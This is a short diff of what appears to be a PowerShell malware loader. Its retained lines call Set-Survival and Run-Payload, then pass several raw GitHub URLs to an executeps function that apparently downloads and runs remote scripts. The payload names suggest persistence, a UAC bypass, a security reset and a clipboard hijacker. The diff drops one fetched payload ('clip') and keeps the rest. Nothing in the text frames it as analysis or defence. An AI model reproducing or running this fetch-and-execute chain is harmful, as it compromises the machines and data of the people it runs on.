@@ -112,7 +112,6 @@ function executeps {
 
 Set-Survival
 Run-Payload
-executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/clip")
 executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/depload")
 executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/dreset")
 executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/duac")
